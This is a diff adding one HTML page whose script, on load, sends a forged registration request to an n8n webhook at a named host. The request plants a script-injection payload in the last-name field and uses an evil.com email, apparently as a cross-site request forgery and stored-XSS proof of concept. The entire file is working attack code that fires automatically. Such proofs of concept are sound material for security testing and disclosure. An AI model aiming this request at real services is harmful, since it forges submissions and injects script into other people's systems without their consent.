@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch("https://n8ntest.qamal.org/webhook/registration", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          firstName: "Attacker",
+          lastName: "<script>alert('XSS')</script>",
+          phone: "+77000000000",
+          email: "csrf@evil.com",
+          chatId: "1185306175"
+        })
+      });
+    </script>
+  </body>
+</html>
